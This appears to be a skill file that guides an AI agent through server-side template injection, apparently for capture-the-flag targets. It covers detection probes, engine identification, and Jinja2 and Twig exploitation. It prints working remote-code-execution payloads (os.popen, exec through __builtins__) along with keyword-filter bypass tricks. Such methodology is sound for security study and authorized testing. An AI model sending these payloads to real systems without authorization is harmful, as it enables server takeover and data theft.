---
name: ssti-methodology
description: "Detection, engine identification, and exploitation of server-side template injection (SSTI). Use when the target is a Flask/Jinja2/Django/Twig/Mako/Pug application, when user input is reflected back, or when parameter names contain template/name/message/greeting. Phase 0/1 already covers quick detection and engine identification, so no separate skill is needed. For quick detection and localization only, use Phase 0/1 directly without reading the full exploitation section"
zh-signals: "服务端模板注入的检测、引擎识别与利用方法。信号:SSTI,模板注入,Jinja2,Twig,RCE"
when-to-use: >-
  Use when user input is reflected in page output or a Flask, Django, Jinja2, Twig, Mako, or Pug application is suspected of template injection.
metadata:
  tags: "ssti,template injection,template-injection,server-side template injection,jinja2,django,twig,mako,rce,sandbox-escape"
  category: "exploit"
---

# SSTI Server-Side Template Injection Methodology

## ⛔ Deep Reference (read the matching file once the engine is confirmed)

- Jinja2 complete exploit chain (context variables → file read → RCE) → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
- Twig/Mako/FreeMarker/Pug/Django exploitation or filter bypass → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
- Multi-engine RCE payload quick reference and sandbox escape → [references/multi-engine-payloads.md](references/multi-engine-payloads.md)

---

## Phase 0: Injection Point Localization (do this first!)

**Do not blindly try SSTI payloads on every parameter!** First determine which parameters get rendered by the template:

1. Use analyze_response to see which parameter values **appear in the response**
2. Only **parameters reflected back into the page** can be injection points
3. Common reflected parameters: `name`, `username`, `message`, `greeting`, `template`, `title`, `q`, `search`

**Trap**: An HTML-escaped reflection (`<` → `&lt;`) may still be rendered by the template — `{{7*7}}` may still work.

## Phase 1: Template Injection Detection (Decision Tree)

```
Step 1: Send {{7*7}}
  → Returns 49 → go to Step 2
  → Returned as-is → not Jinja2/Twig, go to Step 3
  → Empty/error response → filtering is likely in place, try {{7*'7'}}

Step 2: Send {{7*'7'}}
  → Returns 7777777 → Jinja2 (Python) ★most common
  → Returns 49 → Twig (PHP)

Step 3: Send ${7*7}
  → Returns 49 → Java EL / Mako / FreeMarker
Step 4: Send #{7*7}
  → Returns 49 → Ruby ERB or Pug
```

## Phase 2: Engine Identification Helper Table

| Engine | Language | Server header clues | Confirmation method |
|------|------|-------------|---------|
| Jinja2 | Python/Flask | Werkzeug, gunicorn | `{{config}}` produces output |
| Django | Python | WSGIServer | `{{settings.DEBUG}}` |
| Twig | PHP | Apache+PHP | `{{_self.env.display('id')}}` |
| Mako | Python | - | `${self.module.__builtins__}` |
| FreeMarker | Java | Tomcat, Spring | `${.now}` returns the current time |
| Pug/Jade | Node.js | Express | `#{7*7}` returns 49 |

## Phase 3: Exploitation Decision Tree

```
Confirm the engine type
├─ Jinja2? → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)
│   Priority: context variables → config → file read → RCE (lipsum chain)
├─ Twig? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
├─ Mako/FreeMarker/Pug? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
├─ Django? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md)
│   No RCE! Priority: enumerate context variables → request.META → settings → admin path discovery
└─ Filtering present? → [references/other-engines-and-bypass.md](references/other-engines-and-bypass.md) (filter bypass section)
```

**Jinja2 Quick Reference** (full payloads → [references/jinja2-exploitation.md](references/jinja2-exploitation.md)):
```
{{lipsum.__globals__['os'].popen('id').read()}}       # RCE first choice
{{config}}                                              # read configuration
```

## Notes
- **Simple before complex**: context variables → config → file read → RCE
- **URL encoding**: `{{` `}}` must be encoded when injecting into GET parameters
- **Error messages**: 500 pages may leak the engine type and the Python version

## Phase 4: Advanced Exploitation Techniques

### 4.1 Subclass Enumeration and Payload Construction
- Use a for loop with enumerate to walk the subclass list
- Target classes: `os._wrap_close`, `subprocess.Popen`
- Conditional filter: `if 'popen' in str(cls)` — string matching to select candidates
- Indexes differ across environments, so find them dynamically instead of hardcoding an index

### 4.2 Filter Bypass Techniques
- Pass parameters externally: `?a=__class__&b=__mro__`, then reference them in the template with `request.args.a`
- Filters only inspect template content, not URL parameters
- Split the payload: keep the injection point separate from the data point
- When a keyword is filtered, reach the builtins module through `globals.__self__` and bypass it with string concatenation:
  ```python
  {{ globals.__self__.exec("imp" + "ort o" + "s;o" + "s.system('cat /flag')") }}
  {{ request.__class__.__init__.__globals__.__builtins__.exec("__imp"+"ort__('o'+'s').system('id')") }}
  ```

### 4.3 Exploitation Order
- Highest priority: try the simple option first — direct variable access (`{{config}}`)
- Order: confirm before exploiting — identify the engine first, then pick the payload
- Finally: use http_request to send the RCE payload and capture the flag
